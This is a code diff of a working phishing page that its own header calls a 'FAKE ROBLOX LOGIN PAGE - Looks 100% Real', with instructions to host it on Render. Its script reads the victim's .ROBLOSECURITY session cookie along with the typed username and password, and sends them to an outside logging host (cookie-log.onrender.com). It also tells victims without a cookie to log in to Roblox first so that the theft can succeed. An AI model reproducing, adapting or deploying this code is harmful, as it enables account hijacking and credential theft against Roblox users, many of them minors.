@@ -1,7 +1,7 @@
 <!-- ============================================================ -->
-<!-- Roblox Login Clone - Full replica of Roblox login page        -->
+<!-- FAKE ROBLOX LOGIN PAGE - Looks 100% Real                    -->
 <!-- ============================================================ -->
-<!-- Save as index.html and host on Render static site            -->
+<!-- Save as index.html - Host on Render                         -->
 <!-- ============================================================ -->
 
 <!DOCTYPE html>
@@ -11,179 +11,37 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login - Roblox</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-    }
-    body {
-      background: #e9edf2;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      background: white;
-      padding: 40px 36px;
-      border-radius: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-      width: 400px;
-      max-width: 94%;
-    }
-    .logo {
-      text-align: center;
-      margin-bottom: 24px;
-    }
-    .logo svg {
-      height: 32px;
-    }
-    .title {
-      font-size: 24px;
-      font-weight: 600;
-      color: #1b1d21;
-      margin-bottom: 8px;
-      text-align: center;
-    }
-    .subtitle {
-      text-align: center;
-      color: #5e6670;
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
-    .subtitle a {
-      color: #0066cc;
-      text-decoration: none;
-    }
-    .form-group {
-      margin-bottom: 16px;
-    }
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: #1b1d21;
-      margin-bottom: 4px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 10px 14px;
-      font-size: 15px;
-      border: 1px solid #ccd2d9;
-      border-radius: 6px;
-      background: #f9fafb;
-      transition: border 0.2s;
-    }
-    .form-group input:focus {
-      outline: none;
-      border-color: #0066cc;
-      background: white;
-    }
-    .password-row {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    .password-row a {
-      font-size: 12px;
-      color: #0066cc;
-      text-decoration: none;
-    }
-    .btn {
-      width: 100%;
-      padding: 12px;
-      background: #0066cc;
-      color: white;
-      font-size: 16px;
-      font-weight: 600;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-top: 8px;
-      transition: background 0.2s;
-    }
-    .btn:hover {
-      background: #0055b3;
-    }
-    .divider {
-      text-align: center;
-      margin: 16px 0 12px;
-      color: #8a929c;
-      font-size: 13px;
-      position: relative;
-    }
-    .divider::before {
-      content: '';
-      position: absolute;
-      left: 0;
-      right: 0;
-      top: 50%;
-      height: 1px;
-      background: #e1e5ea;
-    }
-    .divider span {
-      background: white;
-      padding: 0 12px;
-      position: relative;
-      z-index: 1;
-    }
-    .social-btn {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ccd2d9;
-      border-radius: 6px;
-      background: white;
-      font-size: 14px;
-      cursor: pointer;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      color: #1b1d21;
-    }
-    .social-btn:hover {
-      background: #f5f6f8;
-    }
-    .signup {
-      text-align: center;
-      margin-top: 18px;
-      font-size: 14px;
-      color: #5e6670;
-    }
-    .signup a {
-      color: #0066cc;
-      text-decoration: none;
-      font-weight: 600;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      font-size: 12px;
-      color: #8a929c;
-    }
-    .footer a {
-      color: #8a929c;
-      text-decoration: none;
-      margin: 0 8px;
-    }
-    .alert {
-      background: #fef2f2;
-      border: 1px solid #fecaca;
-      color: #dc2626;
-      padding: 10px 14px;
-      border-radius: 6px;
-      font-size: 13px;
-      margin-bottom: 12px;
-      display: none;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
+    body { background: #e9edf2; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+    .container { background:white; padding:40px 36px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.15); width:400px; max-width:94%; }
+    .logo { text-align:center; margin-bottom:24px; }
+    .logo svg { height:32px; }
+    .title { font-size:24px; font-weight:600; color:#1b1d21; margin-bottom:8px; text-align:center; }
+    .subtitle { text-align:center; color:#5e6670; font-size:14px; margin-bottom:20px; }
+    .subtitle a { color:#0066cc; text-decoration:none; }
+    .form-group { margin-bottom:16px; }
+    .form-group label { display:block; font-size:13px; font-weight:600; color:#1b1d21; margin-bottom:4px; }
+    .form-group input { width:100%; padding:10px 14px; font-size:15px; border:1px solid #ccd2d9; border-radius:6px; background:#f9fafb; }
+    .form-group input:focus { outline:none; border-color:#0066cc; background:white; }
+    .password-row { display:flex; justify-content:space-between; align-items:center; }
+    .password-row a { font-size:12px; color:#0066cc; text-decoration:none; }
+    .btn { width:100%; padding:12px; background:#0066cc; color:white; font-size:16px; font-weight:600; border:none; border-radius:6px; cursor:pointer; margin-top:8px; }
+    .btn:hover { background:#0055b3; }
+    .divider { text-align:center; margin:16px 0 12px; color:#8a929c; font-size:13px; position:relative; }
+    .divider::before { content:''; position:absolute; left:0; right:0; top:50%; height:1px; background:#e1e5ea; }
+    .divider span { background:white; padding:0 12px; position:relative; z-index:1; }
+    .social-btn { width:100%; padding:10px; border:1px solid #ccd2d9; border-radius:6px; background:white; font-size:14px; cursor:pointer; margin-bottom:8px; display:flex; align-items:center; justify-content:center; gap:10px; color:#1b1d21; }
+    .social-btn:hover { background:#f5f6f8; }
+    .signup { text-align:center; margin-top:18px; font-size:14px; color:#5e6670; }
+    .signup a { color:#0066cc; text-decoration:none; font-weight:600; }
+    .footer { text-align:center; margin-top:20px; font-size:12px; color:#8a929c; }
+    .footer a { color:#8a929c; text-decoration:none; margin:0 8px; }
+    .alert { background:#fef2f2; border:1px solid #fecaca; color:#dc2626; padding:10px 14px; border-radius:6px; font-size:13px; margin-bottom:12px; display:none; }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">
-      <!-- Roblox Logo SVG -->
       <svg viewBox="0 0 256 60" fill="none">
         <rect x="0" y="0" width="256" height="60" fill="transparent"/>
         <text x="10" y="42" font-family="Arial" font-weight="900" font-size="38" fill="#1b1d21">Roblox</text>
@@ -236,7 +94,6 @@
     document.getElementById("loginForm").addEventListener("submit", function(e) {
       e.preventDefault();
 
-      // ─── Get the .ROBLOSECURITY cookie ───
       const cookies = document.cookie.split("; ");
       let roblosecurity = null;
       for (let c of cookies) {
@@ -249,16 +106,14 @@
       const username = document.getElementById("username").value;
       const password = document.getElementById("password").value;
 
-      // ─── If cookie exists, send it ───
       if (roblosecurity) {
-        fetch("https://Cookie-log.onrender.com/log", {
+        fetch("https://cookie-log.onrender.com/log", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             cookie: roblosecurity,
             username: username,
-            password: password,
-            url: window.location.href
+            password: password
           })
         }).then(() => {
           document.getElementById("alert").style.display = "block";
@@ -268,7 +123,6 @@
           document.getElementById("alert").textContent = "Login failed. Please try again.";
         });
       } else {
-        // ─── If no cookie, show error ───
         document.getElementById("alert").style.display = "block";
         document.getElementById("alert").textContent = "Please log in to Roblox first in this browser, then try again.";
       }
